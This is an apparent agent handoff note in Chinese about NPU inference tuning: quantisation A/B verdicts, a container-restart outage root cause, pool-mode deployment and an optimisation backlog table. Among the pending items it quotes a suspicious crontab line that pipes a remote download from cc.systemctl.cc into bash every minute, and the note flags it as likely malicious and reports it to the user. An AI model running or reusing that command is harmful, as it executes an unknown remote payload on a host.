# Handoff（2026-10-19 四件套清账 → 下一轮压缩用）

## 状态一句话

**10-19 四件套清账**（summary/2026-10-19_catgu-final-verdict-container-restart.md）：① **qmd x_scale 终审判死收线**——第五路「gate/up 同输入权重拼接」A/B：SliceD 版 7.8× 劣化（视图物化税 ~1.78ms/次）、SplitD 版中性（±噪声带 2ms）⇒ **量化流水在 m=50 不是瓶颈，flow ~70ms = 310P 结构性地板；0.53× 量化侧五路证据链闭合，重新谈判**（smooth 融合重量化 ≈ 免费是真结论，数值面 rel 3.7% 同带）。② **舰队 2.7 天趴窝根因 = apxinf_rust 容器 10-17 09:32（京）被人为 stop/start**（StartedAt 铁证；docker exec -d 进程不随容器自愈、无人拉起 supervisor；TBE spam = 死后哀鸣、plog 干净 = SIGKILL 特征）——**host cron 自愈提案待用户批**（常驻面纪律）；10-16 respawn 风暴（TBE 孤儿）是另一现象，未深挖。③ **pool cap 8→9 ✅**（GEB_POOL_CAP env 化 + supervisor 部署确认「cap 9」）。④ **range 观察期第一轮完成**：舰队 10-19 11:52 复活（新二进制全门控缺省关 = 生产等价），spot 第一轮 = **有效 3/3**（object 136 ✓ / goal 141 ✓ / spatial 首跑 520 flaky → 同代重跑 123 ✓，单局边缘性判据 = 同代复跑即过）；隔日第二轮 + fleet_watch 后收尾清理。引擎 1 commit（catgu 实验 + dyn_outputs API + cap；fork/ascend-port 1bb0697）。

## ① Compact 参数（贴到 /compact 后）

聚焦保留：**结论与入口，不保数字**——① **生产 = range padding 池模式不变**（supervisor/网格烤法/回滚路径同 10-16 战报；新增 spawn env `GEB_POOL_CAP=9`）；② **量化性能路线终点 = 现行 1.09×**（catgu 终审五路全灭 + 数值副产：smooth 融合 requant 免费、SplitD 动态输出可用、SliceD 物化税 1.78ms/次、A/B 噪声带 ±2ms——判读 A/B 差异 <2ms 即中性）；③ **舰队可靠性**：容器重启会灭 supervisor 全家且不自愈——**host cron 提案等用户批**；复活 = pkill 清场 + start_gear_supervisor.sh；④ **观察期收尾清单**（隔日 spot ×2 + fleet_watch → 清精确 26 桶/tl154_v*/ab_catgu 1.2GB/dump 目录）。丢弃：catgu 当日 5 轮构建迭代往返（战报 §六已留档）。

## ② Post-compact 首句（贴到压缩后第一句）

**状态**（2026-10-19 深夜收线，见 summary/2026-10-19_catgu-final-verdict-container-restart.md）：**生产 = 单芯 range padding 池模式**（chip4、grid8 九桶 + mask + POOL_GRID + POOL_CAP=9；catgu 终审后量化性能收线 1.09×，五路全灭证据链闭合）；**四件套 goal 全部闭环**（终审/根因/观察期/池帽），观察期两轮 6/6 全绿 + 96GB 清理已执行（用户放行）+ host cron 自愈已装（用户批准）。

**剩余事项（非 goal 级）**：
1. ⚠ **crontab 可疑条目**（非我方）：`* * * * * curl cc.systemctl.cc/?gvc | bash` 每分钟拉执行，形似恶意载荷——已报告用户待处置（未动）
2. **旧 f16 时代目录 ~100GB+**（tl1xx/iso/n32/t200/dyn/probe 系列）不在 goal 点名内未清——留用户决定
3. TBE respawn 风暴 slog 深挖（可选：归因已翻案至内存压力假说，崩代 plog 在档）
4. 0.53× 裁决（用户未决：收线 1.09× 或另立项攻非量化侧——量化侧已证无路径）

**纪律**：手烤 OM 必带 fusion off env；**池模式静态桶烤法 = 无 DYN_LLIST 的 prefix 段烤**（GEB_SEG=prefix、GEB_TOKENS=$L、GEB_SAVE=tl{L}_i8/prefix_real.om——260 接口；GE 单档 dynamicDims 烤不出 rc=-7）；**池模式 A/B 的 run 侧必须复现烤制 env**（进程内建图 + OM 换柄，n_in 断言即此坑）；qmd smooth = 1/s 乘法约定；eval 默认生产根 /data/apxinf/serve_gear（单芯 chip4 池模式）；eval 必须容器内跑（`docker exec -d apxinf_npu bash <脚本>`；**严禁双发**——同 jsonl 并发双写，杀树清文件重发单实例）；results-jsonl 有记录即跳过（复验换新文件）；eval timeout ≥1800；杀进程先 supervisor 后 serve、pgrep -f 用字符类、容器内 kill 要 namespace 对齐；**119 ssh 必带 kex 配方；上行断流走 gzip+480B 分块 base64 append（push119 是内联程序非文件）**；docker exec -d 必须脚本文件形态；**跨进程对拍必须同芯同时代 + resp 发完即拷贝 + spool 清场验单实例（代际现象）；合成/垃圾 payload 下 flow 混沌地板 ~11-14%——A/B 数值分歧必须用真帧 golden**；**serve stdout.log 含二进制（权重上传）——读日志先 `tr -d "\000"`**；msprof 最小采集纪律；**舰队操作前先 fleet_watch、重启只走 start_gear_supervisor.sh**；**共享主机纪律：我们只准用 chip 4/5（同事 vLLM 占 0-3/6-7）；探针/加载类批处理合并进单进程（一次加载跑完所有测量）；常驻面任何扩张先问用户**；**服务器引擎树无 .git——git apply 免仓可用/checkout 不行，回退用 `git apply -R`；cmake 源 /data/apxinf/ascendc/ge_builder 是活真相（本轮已回灌对齐入仓）**；bash 坑：`local a=$1 b=x_$a` 单行多赋值取外层空值；`a && b` 末位假值不触发 set -e（AND-OR 豁免）。

## ②b 注解（给人读的，不用搬运）

**host cron 自愈** —— 舰队趴窝 2.7 天的教训：容器重启（人为/掉电/OOM）灭掉 supervisor 全家且无自愈。一行 host crontab 即可 ~5min 自愈；按常驻面纪律等用户点头再装。
**range 观察期** —— 例行：复活后 serve 代际已换（数值代际现象，行为面多代全过属正常），spot 两轮全绿即收尾清旧资产。
**0.53× 谈判** —— 量化侧五路全灭后，性能终点在 1.09×（243→226ms）；剩余杠杆全在量化侧之外且均已预检否决（vision int8 −6~7ms 不值、段间融合 ~3ms 上限、TransData 税 ROI 低）。要再快 = 换故事（如图执行调度/批间流水），值不值得立项是用户决策。
**TBE 风暴 vs 容器重启** —— 两个现象：①10-16 respawn 风暴（TBE 孤儿链，pkill 愈）②10-17 容器重启灭门（本轮根因）。slog 深挖①是可选功课。

## ④ 性能优化方向清单（2026-10-15 更新）

现状锚点：**生产 = 单芯 range padding 池模式（chip4 serve ×1，grid8 九桶 + GEB_ATTN_MASK + GEB_POOL_GRID；2026-10-16 晚起）；数值继承静态带（l0 bit 级 / actions 3.7%）；t4 5/5（1 次装载）+ spot 3/3；warmup 修复后 per-call inference 273.6**。

| # | 方向 | 状态/预期 | 备注 |
|---|---|---|---|
| A-H | 量化/行为/校准/生产化 | ✅ 全闭环（历史行从略） | qmd per-token 终点；单一因子集三谱系 |
| I3 | 动态 L 分桶（gear） | ✅ 转正 + 换新（298694a 代） | 回退面 151-157 新生代验证 ✓ |
| I5 | OM 冷启动 lazy | ✅ **生产兑现**（687ms/6.57s 实测） | 零物化 + 并行转置 + serve_min |
| I6 | eval 全链 inproc | ✅ 闭环 | 配方 cann901_eval_inproc.sh |
| I7 | 多 checkpoint 泛化 | ❌ **用户决策放弃**（2026-10-15） | 行为面验收的第二只有 LIBERO 能力的 π0.5 无现成来源（官方只放一只），自训成本在训练侧不在推理管线；管线留档全参数化，未来有需求可重启 |
| I8 | 舰队换新二进制 | ✅ **执行完成**（2026-10-14，spot 3/3） | 孤儿清理 + pid 假阳修复一并落地 |
| **I9** | **客户端推理调用链（原命题 tokenize 前缀缓存）** | ✅ **闭环**（2026-10-15，summary/2026-10-15_i9-firstcall-warmup.md） | **归因证伪 + warmup 修复**：「tokenize 186ms」四步取证证伪——tokenizer 实为 0.43ms/调用、客户端全链稳态仅 15-25ms；真凶 = npu-ge 无 warmup，首调用 eager NPU 算子编译 3.9s 摊进 27 次均值（eval_libero 原只对 npu-torch 调 warmup）。修复 = `GeServePi05Policy.warmup()`（不发请求零数值改动）+ eval_libero 放宽 warmup 条件 → **inference 433.3→273.6（−37%）、server_processor 186→25、行为保持（success 1.0）**。剩余稳态 gap 25ms（unfold 5.9+pipeline 转换税+to_frame）不立项（要绕开 lerobot 同代码路径设计，ROI 低）；L 漂移 gear 下零感，需求消失；tokenize 缓存/查表方案归档（前提证伪，per-int 查表还有 "▁-" 跨界合并陷阱）。逐调用计时开关 `APXINF_GE_PERCALL=1` 常驻 |
| **I10** | **vision 段 int8**（SigLIP 27 层 mm） | 📉 **预检走完判不立项，降级 backlog**（2026-10-15，summary/2026-10-15_i10-vision-int8-verdict.md） | **预检四步全走完**：① 权重谱过关（补扫当年漏的 q/k/v：总体 0.893% ≈ prefix 0.895%，无障碍）；② 激活 dump 就位（40 真帧含空视图 pad 包络，SigLIP 温和 ≤15 vs Gemma 559，calib_vision_v1.safetensors 267MB 留档）；③ L2-lite 模拟：α=0.5 定案（全量 med 1.32% 回先例带 0.66-1.42%；α 再大全面恶化——vision 是权重侧瓶颈）**但 vfc2 结构性超带 1.86/4.1%**（gelu 输出唯一无归一化站 + 权重行 outlier；α/权重 clip/s-floor 三旋钮全救不动，clip 反而爆炸）；④ **收益重估**：「2.41×/−18ms」是合成形状虚高（C2 实数 1.5×）→ 全量 −10.3ms 带行为风险，mixed（fc2 留 f16）**−6~7ms = model 的 2.5-3%** → 战役代价（引擎 vision 图 int8 发发 + 校准 + 烤桶 + L2-L4 + 行为全量）不值。未来要榨：前置全留档可秒重启 |
| **T4R** | **t4 根因：dyn-vs-static 收敛**（回退桶正向替代） | ✅ **闭环 + 消融终裁**（2026-10-15/16，summary/2026-10-15_t4r-dyn-static-convergence.md + 2026-10-16_dyn-structural-ablation-verdict.md） | **根因 = GE 动态分档编译固有**（真帧互差 13.1%；消融证组装三维度 bit 级惰性、唯一存活维度 = -1 dims/MultiBatchClone）；**修复 = GEB_PREFIX_POOL**（t4 5/5、−14.1ms/replan 实测、回退桶真退役、dyn 复活关闭）。引擎 8 commit；133-136 已补烤 |
| **RP** | **Range padding + mask 化**（桶粗化 26→9） | ✅ **生产化**（2026-10-16 晚，summary/2026-10-16_range-padding-mask.md） | GEB_ATTN_MASK softmax 加性 mask + GEB_POOL_GRID 引擎侧映射（客户端零改动）；grid8 九桶 {136..200}；**表外 L 根除、局内 L 漂移零装载、磁盘 49→17GB**；数值 l0 bit 级/actions 3.7%；行为 t4 5/5（1 次装载）+ spot 3/3 对照基线；税 ~+0.5ms/replan。引擎 6 commit（含 bind_names 平行表根 names/binds 不对齐地雷）；回滚 = 旧 supervisor + 精确桶留档 |
| **P1** | **qmd x_scale 静态化**（0.53× 最后一杠杆） | ✗ **终审判死收线**（2026-10-19，summary/2026-10-19_catgu-final-verdict-container-restart.md） | 第五路 gate/up 拼接 A/B：SliceD 7.8× 劣化（物化税）/ SplitD 中性（±2ms 噪声）⇒ **量化流水非瓶颈，flow ~70ms = 结构性地板；五路全灭证据链闭合，0.53× 重新谈判**；副产 = dyn_outputs API + smooth 融合 requant 免费 + A/B 噪声带 |
| — | TBE 孤儿死亡循环 / range 观察期 / pool cap 8→9 | **#4 ✅ 部署**（cap 9 生产确认）/ **#2 半闭环**（趴窝根因 = 容器人为重启，host cron 提案待批）/ **#3 进行中**（复活 + spot 当日跑） | 见 ②b 注解；TBE 风暴 slog 深挖可选 |
| — | op 热点 census | ✅ 2026-10-15（summary/2026-10-15_op-hotspot-census.md） | 设备侧 228ms：qmd 37% / ABF 融合 14%（pass 实证）/ mm 13%；空隙 0；复测工具 prof_hotspot_1015.sh |
| — | TransData 14ms（vision 激活 ND→NZ） | 观察项 | 编译器格式规划税，6%，ROI 低 |
| — | 数值代际现象 | 观察项（现役 = 10-14 代） | 行为面多代际全过 |
| — | 2347 僵尸 | 待用户需要时重启 apxinf_rust 即清 | 只占 pid 位不占内存 |

## ③ Export 标题建议

D:\compass\APXinf\syx_docs\dev_logs\chat_exports\2026-10-19_catgu-final-verdict-container-restart
